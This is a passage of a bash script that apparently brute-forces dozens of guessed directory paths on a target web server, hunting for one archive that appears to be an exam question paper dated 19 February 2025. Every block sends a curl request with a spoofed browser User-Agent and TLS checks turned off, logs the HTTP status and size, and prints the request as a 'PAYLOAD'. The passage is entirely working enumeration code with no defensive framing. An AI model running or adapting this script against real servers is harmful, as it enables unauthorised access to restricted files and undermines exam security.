" "${target}ProcessingSuite_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_Manager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Upload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Upload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloudAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloudAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloudAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteQPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteQPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
